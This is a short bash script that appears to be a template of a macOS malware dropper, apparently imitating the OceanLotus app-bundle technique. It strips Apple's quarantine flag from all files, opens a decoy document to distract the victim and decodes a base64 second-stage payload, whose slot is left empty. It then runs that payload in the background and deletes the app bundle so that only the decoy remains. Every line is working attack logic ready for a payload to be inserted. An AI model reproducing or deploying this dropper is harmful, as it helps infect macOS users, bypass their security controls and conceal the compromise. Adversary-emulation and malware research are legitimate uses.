#!/bin/bash
current_directory="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
current_file="$( basename "${BASH_SOURCE[0]}" )"

# replace with base64 encoded second stage payload
b64_stuff=""

# points to decoy doc in application bundle
TEMPPATH_IOP="Contents/Resources/default.config"
# name of decoy document to drop
doc_name="Decoy.doc"
# filename of second stage
temp_var="b2NlYW5sb3R1czIz"

# remove quarantine flag on application bundle
find . -exec xattr -d com.apple.quarantine {} + & >/dev/null 2>&1

# get path to the application bundle
parent_path_copy="$( dirname "$current_directory/$current_file" )"
parent_path_copy="$( dirname "$parent_path_copy" )"
parent_parent_path="$( dirname "$parent_path_copy" )"

# copy decoy doc to tmp and open it
cp "$parent_path_copy/$TEMPPATH_IOP" "/tmp/$doc_name" && open -n "/tmp/$doc_name"

# replace decoy doc in application bundle with decoded second stage, make executable, then attempt to execute in background
echo $b64_stuff | base64 -D > "$parent_path_copy/$TEMPPATH_IOP" && chmod +x "$parent_path_copy/$TEMPPATH_IOP" && "$parent_path_copy/$TEMPPATH_IOP" & >/dev/null 2>&1

# remove application bundle then move decoy doc from tmp to the current execution path
sleep 3 ; rm -rf "$parent_path_copy" ; mv "/tmp/$doc_name" "$parent_parent_path/$doc_name" ;
